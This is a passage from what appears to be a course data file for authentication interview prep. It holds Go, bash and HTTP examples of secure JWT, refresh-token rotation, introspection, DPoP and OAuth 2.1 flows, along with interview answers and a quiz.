          hint: `<ul><li>Store only <code>SHA-256(token)</code>, plus <code>family_id</code>, <code>used_at</code>, <code>revoked</code>, <code>expires_at</code>, <code>client_id</code>.</li><li>In one transaction with <code>SELECT ... FOR UPDATE</code>: if already used &rarr; revoke the whole family.</li><li>New token inherits the family's absolute expiry.</li><li>Optional short grace window for concurrent refreshes.</li></ul>`,
          solution: `func (s *Service) Refresh(ctx context.Context, presented, clientID string) (*TokenPair, error) {
    h := sha256Hex(presented)
    tx, err := s.db.BeginTx(ctx, nil)
    if err != nil {
        return nil, err
    }
    defer tx.Rollback()

    var rt struct {
        Family, User, Client string
        UsedAt               sql.NullTime
        Revoked              bool
        Expires              time.Time
    }
    err = tx.QueryRowContext(ctx, \`
        SELECT family_id, user_id, client_id, used_at, revoked, expires_at
        FROM refresh_tokens WHERE token_hash = $1 FOR UPDATE\`, h).
        Scan(&rt.Family, &rt.User, &rt.Client, &rt.UsedAt, &rt.Revoked, &rt.Expires)
    if errors.Is(err, sql.ErrNoRows) {
        return nil, ErrInvalidGrant
    } else if err != nil {
        return nil, err
    }
    if rt.Revoked || time.Now().After(rt.Expires) || rt.Client != clientID {
        return nil, ErrInvalidGrant
    }
    if rt.UsedAt.Valid {
        // Reuse of a rotated token: someone holds a stolen copy. Kill the whole family.
        if _, err := tx.ExecContext(ctx, \`UPDATE refresh_tokens SET revoked = true WHERE family_id = $1\`, rt.Family); err != nil {
            return nil, err
        }
        if err := tx.Commit(); err != nil {
            return nil, err
        }
        s.events.Emit(ctx, "refresh_token_reuse", rt.User, rt.Family)
        return nil, ErrInvalidGrant
    }

    newRT := rand.Text() + rand.Text() // ~260 bits
    if _, err := tx.ExecContext(ctx, \`UPDATE refresh_tokens SET used_at = now() WHERE token_hash = $1\`, h); err != nil {
        return nil, err
    }
    if _, err := tx.ExecContext(ctx, \`
        INSERT INTO refresh_tokens (token_hash, family_id, user_id, client_id, expires_at)
        VALUES ($1, $2, $3, $4, $5)\`, sha256Hex(newRT), rt.Family, rt.User, clientID, rt.Expires); err != nil {
        return nil, err
    }
    if err := tx.Commit(); err != nil {
        return nil, err
    }
    at, err := s.mintAccessToken(rt.User, clientID, 5*time.Minute)
    if err != nil {
        return nil, err
    }
    return &TokenPair{AccessToken: at, RefreshToken: newRT, ExpiresIn: 300}, nil
}`,
          lang: 'go'
        },
        {
          t: 'Design token revocation for stateless JWTs',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Start from requirements: revocation latency (seconds? minutes?), scale (RPS), dependency tolerance.</li><li>Layers: short TTL; refresh-token revocation; jti denylist; per-user cut-off; introspection for high-risk endpoints.</li><li>Distribution: Redis + pub/sub to in-process caches; fail-open vs fail-closed decision.</li></ul>`,
          solution: `Requirements: 50k RPS across 40 services; "log out everywhere" and admin-disable must take effect < 30 s.

Design:
1. Access JWT TTL = 5 min; refresh tokens opaque, rotated, stored at the AS -> revoked instantly on logout.
2. Revocation events: AS publishes {type: "user", sub, revoked_before: ts} or {type: "token", jti, exp}
   to a Kafka/Redis pub/sub topic.
3. Each service keeps an in-memory map:
     jtiDeny[jti] = exp          (entries auto-expire at exp -> tiny)
     userCutoff[sub] = ts        (reject tokens with iat < ts; entries expire after max TTL)
   Bootstrapped from Redis on start; updated by subscription (latency ~1 s).
4. Middleware: verify signature/claims locally -> check jtiDeny and userCutoff -> continue.
5. High-risk endpoints (payouts, admin): additionally call introspection (cached 10 s) or require step-up.
6. Failure mode: if the revocation feed is down > 60 s, high-risk endpoints fail closed; others continue (TTL bounds risk).
7. Key compromise: rotate signing key and drop the old kid from JWKS -> invalidates all tokens at once.
Trade-off summary: short TTL alone = 5 min latency, zero infra; denylist = seconds, small state; introspection = real time, network dependency.`,
          lang: 'text'
        },
        {
          t: 'Rotate JWT signing keys with zero downtime',
          d: 'hard',
          type: 'hands-on',
          hint: `<ul><li>Publish first, sign later, retire last.</li><li>Waiting periods: verifier JWKS cache TTL before switching; max token lifetime before removing.</li><li>Automate with a key schedule and alerts; test with tokens signed by both keys.</li></ul>`,
          solution: `# Day 0: create new key (better: in KMS/HSM, e.g. aws kms create-key --key-spec ECC_NIST_P256 --key-usage SIGN_VERIFY)
openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:P-256 -out 2026-11-a.key
openssl pkey -in 2026-11-a.key -pubout -out 2026-11-a.pub

# Day 0: publish JWKS = [2026-10-a (active signer), 2026-11-a (published only)]
curl -s https://auth.example.com/.well-known/jwks.json | jq '[.keys[].kid]'
# ["2026-10-a","2026-11-a"]

# Day 2 (> max JWKS cache TTL of 24h + margin): switch signer to 2026-11-a
# verify new tokens carry the new kid:
echo "$NEW_TOKEN" | cut -d. -f1 | tr '_-' '/+' | base64 -d 2>/dev/null | jq .kid

# Day 2 + max token lifetime (e.g. refresh-issued access tokens 15 min, ID tokens 1h): remove 2026-10-a from JWKS
# Monitor: verification failures by kid on resource servers; alert on "unknown kid" spikes.`,
          lang: 'bash'
        },
        {
          t: 'Build an introspection-backed token validator with caching',
          d: 'hard',
          type: 'coding',
          hint: `<ul><li>POST <code>token=...</code> to the introspection endpoint with the resource server's credentials.</li><li>Cache positive results keyed by SHA-256(token) for <code>min(30s, exp-now)</code>; cache negatives briefly.</li><li>Use singleflight to collapse concurrent lookups; timeouts; fail closed.</li><li><code>active: true</code> is not enough: also check <code>iss</code> and that <code>aud</code> contains this API, or tokens for other resource servers are accepted.</li></ul>`,
          solution: `type Introspection struct {
    Active   bool   \`json:"active"\`
    Sub      string \`json:"sub"\`
    Scope    string \`json:"scope"\`
    ClientID string          \`json:"client_id"\`
    Exp      int64           \`json:"exp"\`
    Iss      string          \`json:"iss"\`
    Aud      json.RawMessage \`json:"aud"\` // string or array of strings
}

type cached struct {
    res   Introspection
    until time.Time
}

type Validator struct {
    endpoint, clientID, secret string
    issuer, audience           string // this API's identifier: active=true alone is not enough
    hc    *http.Client
    group singleflight.Group
    mu    sync.RWMutex
    cache map[string]cached // evict expired entries periodically (or use a bounded LRU)
}

func (v *Validator) Validate(ctx context.Context, token string) (*Introspection, error) {
    sum := sha256.Sum256([]byte(token))
    key := hex.EncodeToString(sum[:]) // never use raw tokens as map keys or log them
    v.mu.RLock()
    c, ok := v.cache[key]
    v.mu.RUnlock()
    if ok && time.Now().Before(c.until) {
        return v.check(c.res)
    }
    out, err, _ := v.group.Do(key, func() (any, error) {
        // shared by all waiters: one caller's cancellation must not fail the others
        ctx, cancel := context.WithTimeout(context.WithoutCancel(ctx), 500*time.Millisecond)
        defer cancel()
        form := url.Values{"token": {token}, "token_type_hint": {"access_token"}}
        req, _ := http.NewRequestWithContext(ctx, http.MethodPost, v.endpoint, strings.NewReader(form.Encode()))
        req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
        req.SetBasicAuth(url.QueryEscape(v.clientID), url.QueryEscape(v.secret))
        res, err := v.hc.Do(req)
        if err != nil {
            return nil, err
        }
        defer res.Body.Close()
        if res.StatusCode != http.StatusOK {
            return nil, fmt.Errorf("introspection status %d", res.StatusCode)
        }
        var in Introspection
        if err := json.NewDecoder(io.LimitReader(res.Body, 1<<16)).Decode(&in); err != nil {
            return nil, err
        }
        ttl := 5 * time.Second // negative cache
        if in.Active {
            ttl = min(30*time.Second, time.Until(time.Unix(in.Exp, 0)))
        }
        v.mu.Lock()
        v.cache[key] = cached{res: in, until: time.Now().Add(ttl)}
        v.mu.Unlock()
        return in, nil
    })
    if err != nil {
        return nil, err // caller returns 401/503: fail closed
    }
    return v.check(out.(Introspection))
}

func (v *Validator) check(in Introspection) (*Introspection, error) {
    if !in.Active || time.Now().Unix() >= in.Exp || in.Iss != v.issuer || !hasAudience(in.Aud, v.audience) {
        return nil, ErrUnauthenticated // a token issued for another API must not work here
    }
    return &in, nil
}

func hasAudience(raw json.RawMessage, want string) bool {
    var one string
    if json.Unmarshal(raw, &one) == nil {
        return one == want
    }
    var many []string
    return json.Unmarshal(raw, &many) == nil && slices.Contains(many, want)
}`,
          lang: 'go'
        },
        {
          t: 'Validate DPoP proofs at a resource server in Go',
          d: 'hard',
          type: 'coding',
          hint: `<ul><li>Require the <code>DPoP</code> authorization scheme for tokens that carry <code>cnf.jkt</code>; reject them under <code>Bearer</code>.</li><li>Parse the proof with an allow-list of <em>asymmetric</em> algorithms; check <code>typ: dpop+jwt</code> and that the embedded JWK is public.</li><li>Verify signature, then: thumbprint == <code>cnf.jkt</code>, <code>htm</code>/<code>htu</code> == this request (URL rebuilt from config, not headers), <code>ath</code> == SHA-256(token), <code>iat</code> fresh, <code>jti</code> unseen.</li></ul>`,
          solution: `import (
    "crypto"
    "crypto/sha256"
    "crypto/subtle"
    "encoding/base64"
    "encoding/json"

    "github.com/go-jose/go-jose/v4"
)

type dpopClaims struct {
    JTI string \`json:"jti"\`
    HTM string \`json:"htm"\`
    HTU string \`json:"htu"\`
    IAT int64  \`json:"iat"\`
    ATH string \`json:"ath"\`
}

type ReplayCache interface{ AddIfAbsent(key string, ttl time.Duration) bool } // e.g. Redis SET NX EX

var dpopAlgs = []jose.SignatureAlgorithm{jose.ES256, jose.EdDSA, jose.PS256} // never HS*, never none

// VerifyDPoP runs AFTER the access token itself was validated (sig, iss, aud, exp).
// jkt is the token's cnf.jkt; publicURL is this request's URL rebuilt from configuration
// (e.g. "https://orders.api.example.com" + r.URL.Path), never from X-Forwarded-* sent by clients.
func VerifyDPoP(r *http.Request, accessToken, jkt, publicURL string, seen ReplayCache, now time.Time) error {
    proofs := r.Header.Values("DPoP")
    if len(proofs) != 1 {
        return errors.New("exactly one DPoP proof required")
    }
    jws, err := jose.ParseSigned(proofs[0], dpopAlgs)
    if err != nil || len(jws.Signatures) != 1 {
        return errors.New("malformed DPoP proof")
    }
    h := jws.Signatures[0].Protected
    if typ, _ := h.ExtraHeaders[jose.HeaderType].(string); typ != "dpop+jwt" {
        return errors.New("wrong proof typ")
    }
    if h.JSONWebKey == nil || !h.JSONWebKey.IsPublic() {
        return errors.New("proof must embed a public JWK")
    }
    payload, err := jws.Verify(h.JSONWebKey)
    if err != nil {
        return errors.New("bad proof signature")
    }
    var c dpopClaims
    if err := json.Unmarshal(payload, &c); err != nil {
        return errors.New("bad proof claims")
    }
    // 1) key binding: the proof key must be the key the token was issued to
    tp, err := h.JSONWebKey.Thumbprint(crypto.SHA256)
    if err != nil || subtle.ConstantTimeCompare([]byte(base64.RawURLEncoding.EncodeToString(tp)), []byte(jkt)) != 1 {
        return errors.New("proof key does not match cnf.jkt")
    }
    // 2) request binding
    if c.HTM != r.Method || !sameHTU(c.HTU, publicURL) {
        return errors.New("htm/htu mismatch")
    }
    // 3) token binding
    sum := sha256.Sum256([]byte(accessToken))
    if c.ATH != base64.RawURLEncoding.EncodeToString(sum[:]) {
        return errors.New("ath mismatch")
    }
    // 4) freshness + replay (cache entries must outlive the iat window)
    if d := now.Sub(time.Unix(c.IAT, 0)); d > time.Minute || d < -5*time.Second {
        return errors.New("stale proof")
    }
    if c.JTI == "" || !seen.AddIfAbsent(jkt+":"+c.JTI, 2*time.Minute) {
        return errors.New("replayed proof")
    }
    return nil
}

func sameHTU(htu, want string) bool { // compare scheme, host and path; ignore query and fragment
    a, err1 := url.Parse(htu)
    b, err2 := url.Parse(want)
    return err1 == nil && err2 == nil && strings.EqualFold(a.Scheme, b.Scheme) &&
        strings.EqualFold(a.Host, b.Host) && a.Path == b.Path
}

// Middleware sketch:
//   scheme, tok, _ := strings.Cut(r.Header.Get("Authorization"), " ")
//   claims := validateAccessToken(tok)                       // usual JWT checks
//   if claims.Cnf.JKT != "" && !strings.EqualFold(scheme, "DPoP") -> 401 (downgrade to Bearer)
//   if err := VerifyDPoP(r, tok, claims.Cnf.JKT, cfg.BaseURL+r.URL.Path, cache, time.Now()); err != nil ->
//       401 + WWW-Authenticate: DPoP error="invalid_dpop_proof"
// Tests: replayed proof, proof for another URL/method, proof signed by a different key, missing ath,
//        HS256 proof, proof with a private JWK, Bearer scheme with a DPoP-bound token.`,
          lang: 'go'
        }
      ],
      interviewFocus: [
        {
          q: 'How do you properly validate a JWT access token in a resource server?',
          a: `<ol>
<li><strong>Size and format</strong>: reject oversized or malformed tokens before parsing JSON.</li>
<li><strong>Algorithm allow-list</strong> configured server-side (e.g. ES256 only); <code>none</code> and unexpected HMAC algorithms rejected.</li>
<li><strong>Key selection</strong> by <code>kid</code> from the issuer's trusted, cached JWKS (configured URL). Ignore <code>jku</code>/<code>x5u</code>/<code>jwk</code> headers; treat <code>kid</code> as an opaque lookup key.</li>
<li><strong>Signature</strong> verification with a typed key.</li>
<li><strong>Time claims</strong>: <code>exp</code> required, <code>nbf</code>, <code>iat</code>, &le; 60 s leeway.</li>
<li><strong>Issuer</strong> exact match; <strong>audience</strong> contains this API; <strong><code>typ</code></strong> is <code>at+jwt</code> so ID tokens can't be replayed as access tokens.</li>
<li><strong>Revocation</strong> check if required (jti denylist / per-user cut-off) and sender-constraint proof (DPoP / mTLS <code>cnf</code>) if used.</li>
<li><strong>Authorization</strong>: scopes for the operation, tenant match, then object-level checks in the handler.</li>
</ol>
<p>Failures return 401 with <code>WWW-Authenticate: Bearer error="invalid_token"</code>; insufficient scope returns 403. Use a vetted library (golang-jwt v5 with parser options) and test the negative cases explicitly.</p>`
        },
        {
          q: 'Why are JWTs hard to revoke, and what would you do about it?',
          a: `<p>A JWT is verified locally from its signature, so the resource server never asks anyone whether it is still valid — that is the whole point of statelessness. Once issued, it stays valid until <code>exp</code>.</p>
<p>Options, combined by risk:</p>
<ul>
<li><strong>Short access-token TTL</strong> (5–15 min) and revocable, rotated refresh tokens: revocation latency equals the TTL.</li>
<li><strong>jti denylist</strong> distributed via Redis/pub-sub, entries expiring at token <code>exp</code> — small, fast.</li>
<li><strong>Per-user cut-off</strong> timestamp ("tokens issued before T are invalid") for logout-everywhere and account disable.</li>
<li><strong>Introspection</strong> or opaque tokens for high-value operations — real-time at the cost of latency/dependency.</li>
<li><strong>Key rotation</strong> as the nuclear option for signing-key compromise.</li>
</ul>
<p>I'd state the revocation-latency requirement first, then pick the cheapest mechanism that meets it, and define fail-open vs fail-closed behavior per endpoint.</p>`
        },
        {
          q: 'Explain refresh token rotation and reuse detection.',
          a: `<p>Each use of a refresh token returns a new refresh token and invalidates the presented one. All tokens descended from one authentication form a <strong>family</strong>.</p>
<p>If an attacker steals a refresh token, either the attacker or the legitimate client will eventually present an <em>already-used</em> token. The server cannot tell which party is legitimate, so it <strong>revokes the entire family</strong>: both lose access, the user re-authenticates, and a security event is logged.</p>
<p>Implementation details: store hashes only; transactional check-and-mark; inherit the family's absolute expiry; short grace period for benign concurrent refreshes; bind to <code>client_id</code>. RFC 9700 requires public clients' refresh tokens to be rotated or sender-constrained (DPoP / mTLS), and sender-constraining is the stronger option because a stolen token is useless without the private key.</p>`
        },
        {
          q: 'HS256 vs RS256 vs ES256 — how do you choose?',
          a: `<ul>
<li><strong>HS256</strong> (HMAC): symmetric. Anyone who can verify can also forge. Only when issuer and verifier are the same trust domain/service, with a 256-bit random key.</li>
<li><strong>RS256/PS256</strong>: asymmetric RSA; universal support; large signatures (256+ bytes) and slower signing. PS256 uses modern PSS padding.</li>
<li><strong>ES256</strong>: ECDSA P-256; 64-byte signatures, fast; widely supported; FAPI-approved.</li>
<li><strong>EdDSA (Ed25519)</strong>: deterministic, fast, hard to misuse; check that your IdP and all consumers support it.</li>
</ul>
<p>For an IdP issuing tokens to many APIs I choose ES256 (or RS256 for compatibility) with keys in KMS/HSM, published via JWKS and rotated regularly. The algorithm is pinned per key on the verifier side to rule out confusion attacks.</p>`
        },
        {
          q: 'When would you encrypt a token (JWE) instead of only signing it?',
          a: `<p>JWS gives integrity and authenticity but the payload is readable by the client and anything in between (logs, proxies, browser). Use <strong>JWE</strong> (or a nested sign-then-encrypt JWT) when:</p>
<ul>
<li>the token carries PII or internal data that the <em>client</em> must not see (e.g. ID tokens delivered via the front channel, OIDC <code>request</code> objects);</li>
<li>regulatory requirements demand confidentiality beyond TLS (e.g. open banking profiles).</li>
</ul>
<p>Often a better answer is <strong>don't put sensitive data in tokens at all</strong>: use opaque tokens or the phantom-token pattern so internal JWTs exist only inside your network. JWE adds key-management complexity (recipient's public key, algorithms like <code>RSA-OAEP-256</code> / <code>ECDH-ES</code> with <code>A256GCM</code>) and its own pitfalls (invalid-curve attacks on old libraries).</p>`
        }
      ],
      quiz: [
        { q: 'How many dot-separated parts does a JWS compact token have, and a JWE?', a: 'JWS has three (header, payload, signature); JWE has five (header, encrypted key, IV, ciphertext, tag).' },
        { q: 'Is a JWS payload confidential?', a: 'No. It is only base64url-encoded; anyone holding the token can read it.' },
        { q: 'Which claim prevents a token for service A being accepted by service B?', a: 'aud (audience); each service must require its own identifier in aud.' },
        { q: 'What does the alg:none attack exploit?', a: 'Libraries that accept unsigned tokens when the header declares alg "none"; prevented by a server-side algorithm allow-list.' },
        { q: 'What is refresh token reuse detection?', a: 'If an already-rotated refresh token is presented again, the server assumes theft and revokes the whole token family.' },
        { q: 'What does RFC 7662 define?', a: 'OAuth 2.0 Token Introspection: an endpoint where resource servers ask whether a token is active and get its metadata.' },
        { q: 'What is the correct order for zero-downtime signing key rotation?', a: 'Publish the new public key, wait for verifier caches to refresh, switch signing to the new key, then remove the old key after its tokens expire.' },
        { q: 'What do DPoP and mTLS-bound tokens have in common?', a: 'Both sender-constrain tokens: the client must prove possession of a private key bound to the token, so stolen tokens cannot be replayed.' },
        { q: 'What does the ath claim in a DPoP proof contain, and why?', a: 'The base64url SHA-256 hash of the access token; it binds the proof to that specific token so a proof cannot be reused with another token.' }
      ],
      resources: [
        { title: 'RFC 8725 — JSON Web Token Best Current Practices', url: 'https://datatracker.ietf.org/doc/html/rfc8725', type: 'docs' },
        { title: 'RFC 7519 — JSON Web Token (JWT)', url: 'https://datatracker.ietf.org/doc/html/rfc7519', type: 'docs' },
        { title: 'RFC 9068 — JWT Profile for OAuth 2.0 Access Tokens', url: 'https://datatracker.ietf.org/doc/html/rfc9068', type: 'docs' },
        { title: 'OWASP JSON Web Token Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html', type: 'docs' },
        { title: 'RFC 9449 — OAuth 2.0 Demonstrating Proof of Possession (DPoP)', url: 'https://datatracker.ietf.org/doc/html/rfc9449', type: 'docs' }
      ]
    },
    // ───────────────────────────────────────────── Module 5 ─────────────────────────────────────────────
    {
      n: 5,
      title: 'OAuth 2.0 & OAuth 2.1',
      summary: `OAuth is delegated authorization: how a client obtains limited access to an API on behalf of a user or itself. This module covers the roles, the Authorization Code + PKCE flow step by step, client credentials, device and refresh grants, token exchange, why implicit and password grants are gone in OAuth 2.1, redirect URI and scope hygiene, and the vulnerabilities interviewers expect you to know (RFC 9700 Security BCP).`,
      topics: [
        {
          title: 'Roles, Endpoints and What OAuth 2.1 Changes',
          def: `<p>OAuth 2.0 (RFC 6749) lets a <strong>client</strong> obtain an <strong>access token</strong> to call an API without handling the user's password.</p>
<table>
<thead><tr><th>Role</th><th>Who</th><th>Example</th></tr></thead>
<tbody>
<tr><td>Resource owner</td><td>the user (or org) who can grant access</td><td>Alice</td></tr>
<tr><td>Client</td><td>application wanting access</td><td>a SPA via BFF, mobile app, CI job</td></tr>
<tr><td>Authorization server (AS)</td><td>authenticates the owner, obtains consent, issues tokens</td><td>Okta, Entra ID, Keycloak, Auth0</td></tr>
<tr><td>Resource server (RS)</td><td>API that validates tokens and serves data</td><td>orders API</td></tr>
</tbody>
</table>
<p>AS endpoints: <code>/authorize</code> (front channel, browser), <code>/token</code> (back channel), plus revocation (RFC 7009), introspection (RFC 7662), pushed authorization requests (PAR, RFC 9126), JWKS and metadata at <code>/.well-known/oauth-authorization-server</code> (RFC 8414).</p>
<p><strong>OAuth is not authentication.</strong> An access token is meant for the API; the client should not treat it as proof of who logged in — that is what OpenID Connect adds.</p>
<p><strong>OAuth 2.1</strong> (IETF draft consolidating RFC 6749 + the Security BCP RFC 9700 and related RFCs):</p>
<ul>
<li>PKCE <strong>required</strong> for all clients using the authorization code flow.</li>
<li><strong>Implicit</strong> and <strong>Resource Owner Password Credentials</strong> grants removed.</li>
<li>Redirect URIs compared by <strong>exact string match</strong>.</li>
<li>Bearer tokens never in query strings.</li>
<li>Refresh tokens for public clients must be <strong>sender-constrained or one-time-use (rotated)</strong>.</li>
</ul>`,
          interview: 'Name the four roles and two main endpoints, state clearly that OAuth is delegated authorization (OIDC adds authentication), and list the OAuth 2.1 changes: PKCE everywhere, implicit and ROPC removed, exact redirect matching, refresh-token protection.',
          examples: [
            {
              label: 'Authorization server metadata (RFC 8414) excerpt',
              lang: 'json',
              code: `{
  "issuer": "https://auth.example.com",
  "authorization_endpoint": "https://auth.example.com/oauth/authorize",
  "token_endpoint": "https://auth.example.com/oauth/token",
  "pushed_authorization_request_endpoint": "https://auth.example.com/oauth/par",
  "revocation_endpoint": "https://auth.example.com/oauth/revoke",
  "introspection_endpoint": "https://auth.example.com/oauth/introspect",
  "jwks_uri": "https://auth.example.com/.well-known/jwks.json",
  "grant_types_supported": ["authorization_code", "client_credentials", "refresh_token",
                            "urn:ietf:params:oauth:grant-type:device_code",
                            "urn:ietf:params:oauth:grant-type:token-exchange"],
  "code_challenge_methods_supported": ["S256"],
  "token_endpoint_auth_methods_supported": ["private_key_jwt", "tls_client_auth", "client_secret_basic"],
  "authorization_response_iss_parameter_supported": true,
  "dpop_signing_alg_values_supported": ["ES256", "EdDSA"]
}`
            }
          ]
        },
        {
          title: 'Authorization Code Flow with PKCE (Step by Step)',
          def: `<p>The default flow for every user-facing client (web, SPA via BFF, mobile, desktop). <strong>PKCE</strong> (RFC 7636, "pixy") binds the authorization code to the client instance that started the flow, so a stolen code is useless.</p>
<ol>
<li>Client generates a <strong>code_verifier</strong> (43–128 chars of high-entropy randomness), <strong>code_challenge</strong> = base64url(SHA-256(verifier)), a random <strong>state</strong> (CSRF protection; also <code>nonce</code> for OIDC). Stores them in the user's session.</li>
<li>Client redirects the browser to <code>/authorize?response_type=code&amp;client_id=..&amp;redirect_uri=..&amp;scope=..&amp;state=..&amp;code_challenge=..&amp;code_challenge_method=S256</code> (or first pushes these via PAR and sends only a <code>request_uri</code>).</li>
<li>AS authenticates the user (password + MFA, passkey, SSO) and shows consent if needed.</li>
<li>AS redirects to the exact registered <code>redirect_uri</code> with <code>?code=..&amp;state=..&amp;iss=..</code>. The code is short-lived (&le; 1 min) and single-use.</li>
<li>Client checks <code>state</code> (and <code>iss</code>, RFC 9207, to stop mix-up attacks), then calls <code>POST /token</code> over the back channel with <code>grant_type=authorization_code</code>, <code>code</code>, <code>redirect_uri</code>, <code>code_verifier</code>, and client authentication if confidential.</li>
<li>AS recomputes SHA-256(verifier) and compares it with the stored challenge, verifies the code was issued to this client and redirect URI, and returns <code>access_token</code>, optional <code>refresh_token</code> (and <code>id_token</code> in OIDC).</li>
<li>Client calls the API with <code>Authorization: Bearer &lt;access_token&gt;</code>; the RS validates it.</li>
</ol>
<p><strong>What PKCE defends against</strong>: authorization code interception (malicious app registering the same custom URL scheme, code leaked via logs/Referer) and code injection. Because the attacker lacks the verifier, the token exchange fails. It complements but does not replace <code>state</code>; with PKCE the AS also detects code injection for confidential clients.</p>`,
          interview: 'Walk through every parameter and every check: verifier/challenge S256, state, exact redirect URI, iss parameter, back-channel exchange with verifier and client authentication. Explain precisely which attack PKCE stops (code interception/injection) and why S256 not plain.',
          examples: [
            {
              label: 'Auth code + PKCE: the HTTP exchange',
              lang: 'http',
              code: `# 1) Front channel: browser is redirected to the AS
GET /oauth/authorize?response_type=code&client_id=web-bff
    &redirect_uri=https%3A%2F%2Fapp.example.com%2Fcallback
    &scope=openid%20orders%3Aread&state=af0ifjsldkj
    &code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256 HTTP/1.1
Host: auth.example.com

# 2) AS redirects back after login + consent
HTTP/1.1 302 Found
Location: https://app.example.com/callback?code=SplxlOBeZQQYbYS6WxSbIA&state=af0ifjsldkj&iss=https%3A%2F%2Fauth.example.com

# 3) Back channel: client redeems the code
POST /oauth/token HTTP/1.1
Host: auth.example.com
Content-Type: application/x-www-form-urlencoded
Authorization: Basic d2ViLWJmZjpzM2NyM3Q=

grant_type=authorization_code&code=SplxlOBeZQQYbYS6WxSbIA
&redirect_uri=https%3A%2F%2Fapp.example.com%2Fcallback
&code_verifier=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk

HTTP/1.1 200 OK
Cache-Control: no-store
Content-Type: application/json

{"access_token":"eyJ...","token_type":"Bearer","expires_in":300,"refresh_token":"rt_...","scope":"openid orders:read","id_token":"eyJ..."}`
            }
          ]
        },
        {
          title: 'Client Credentials, Device Authorization, Refresh and Token Exchange',
          def: `<table>
<thead><tr><th>Grant</th><th>Use case</th><th>Key points</th></tr></thead>
<tbody>
<tr><td><strong>Client credentials</strong></td><td>machine-to-machine; no user</td><td>client authenticates (prefer <code>private_key_jwt</code> or mTLS over secrets); token represents the client; cache until near expiry</td></tr>
<tr><td><strong>Device authorization</strong> (RFC 8628)</td><td>TVs, CLIs, IoT without a browser/keyboard</td><td>device shows <code>user_code</code> + URL; user approves on a phone; device polls <code>/token</code> respecting <code>interval</code> and <code>slow_down</code></td></tr>
<tr><td><strong>Refresh token</strong></td><td>get new access tokens without user interaction</td><td>rotate or sender-constrain; scope can be narrowed, never widened</td></tr>
<tr><td><strong>Token exchange</strong> (RFC 8693)</td><td>service A calls service B on behalf of the user</td><td>swap a <code>subject_token</code> for a new token with different <code>audience</code>/scope; delegation records an <code>act</code> (actor) claim</td></tr>
<tr><td><strong>JWT bearer</strong> (RFC 7523)</td><td>assertion-based grants and client auth</td><td>basis of <code>private_key_jwt</code> and workload identity federation</td></tr>
</tbody>
</table>
<p><strong>Device flow steps</strong>:</p>
<ol>
<li>Device <code>POST /device_authorization</code> with <code>client_id</code>, <code>scope</code> &rarr; <code>device_code</code>, <code>user_code</code>, <code>verification_uri</code>, <code>interval</code>, <code>expires_in</code>.</li>
<li>Device displays "Go to example.com/device and enter WDJB-MJHT" (or a QR code of <code>verification_uri_complete</code>).</li>
<li>User signs in on another device and approves.</li>
<li>Device polls <code>/token</code> with <code>grant_type=urn:ietf:params:oauth:grant-type:device_code</code>; responses <code>authorization_pending</code> / <code>slow_down</code> until success.</li>
</ol>
<p>Device flow is phishable ("enter this code" social engineering) — show clear client name and scopes on the approval page, keep codes short-lived.</p>
<p><strong>Token exchange in microservices</strong>: instead of forwarding the user's broad token to every downstream service (confused deputy risk), the gateway or calling service exchanges it for a token audience-restricted to the next hop, with reduced scope and short lifetime.</p>`,
          interview: 'Match grants to scenarios instantly: user + browser = code + PKCE; service-to-service = client credentials (or workload identity); input-constrained devices = device flow; on-behalf-of = token exchange. Mention private_key_jwt / mTLS client auth over shared secrets.',
          examples: [
            {
              label: 'Client credentials in Go (token cached and refreshed automatically)',
              lang: 'go',
              code: `import "golang.org/x/oauth2/clientcredentials"

func paymentsClient(ctx context.Context) *http.Client {
    cfg := clientcredentials.Config{
        ClientID:     os.Getenv("CLIENT_ID"),
        ClientSecret: os.Getenv("CLIENT_SECRET"), // better: private_key_jwt or mTLS client auth
        TokenURL:     "https://auth.example.com/oauth/token",
        Scopes:       []string{"payments:charge"},
        // RFC 8707 resource indicator -> token audience restricted to one API
        // (some IdPs, e.g. Auth0, use a vendor-specific "audience" parameter instead)
        EndpointParams: url.Values{"resource": {"https://payments.api.example.com"}},
    }
    return cfg.Client(ctx) // adds Authorization: Bearer, re-fetches token near expiry
}`
            }
          ]
        },
        {
          title: 'Confidential vs Public Clients, and the Deprecated Grants',
          def: `<p><strong>Confidential clients</strong> can keep a credential secret (server-side web apps, BFFs, backend services). <strong>Public clients</strong> cannot (SPAs, mobile and desktop apps, CLIs) — anything shipped to a device can be extracted.</p>
<table>
<thead><tr><th>Client auth method</th><th>How</th><th>Strength</th></tr></thead>
<tbody>
<tr><td><code>client_secret_basic</code>/<code>_post</code></td><td>shared secret</td><td>weakest; rotate, store in a secret manager</td></tr>
<tr><td><code>private_key_jwt</code> (RFC 7523)</td><td>client signs a short JWT assertion with its private key</td><td>no shared secret; recommended</td></tr>
<tr><td><code>tls_client_auth</code> / <code>self_signed_tls_client_auth</code> (RFC 8705)</td><td>mTLS client certificate</td><td>strong; also enables certificate-bound tokens</td></tr>
<tr><td>none (public client)</td><td>PKCE only</td><td>relies on redirect URI + PKCE + rotation/DPoP</td></tr>
</tbody>
</table>
<p><strong>Native apps</strong> (RFC 8252): use the system browser (ASWebAuthenticationSession, Android Custom Tabs), never embedded webviews (the app could read the password, and SSO cookies are not shared). Prefer claimed HTTPS redirect URIs (Universal/App Links) over custom schemes; desktop apps can use loopback <code>http://127.0.0.1:{port}</code>.</p>
<p><strong>Why the implicit grant is gone</strong>: it returned the access token in the URL fragment of the redirect — exposed to browser history, Referer leakage, malicious scripts and injection; no client authentication; no refresh tokens; no way to sender-constrain. Code + PKCE now works in browsers (CORS on the token endpoint), so implicit has no reason to exist.</p>
<p><strong>Why ROPC (password grant) is gone</strong>: the client collects the user's password directly — it trains users to type credentials into third-party apps, cannot support MFA, passkeys, SSO or consent, and gives the client full user impersonation. Migrate first-party ROPC users to code + PKCE with the system browser.</p>`,
          interview: 'Explain why a mobile app cannot hold a client secret, what replaces it (PKCE, claimed HTTPS redirects, DPoP), why embedded webviews are forbidden, and give the concrete reasons implicit and ROPC were removed.',
          examples: [
            {
              label: 'private_key_jwt client assertion (decoded payload)',
              lang: 'json',
              code: `// POST /oauth/token  ...&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer
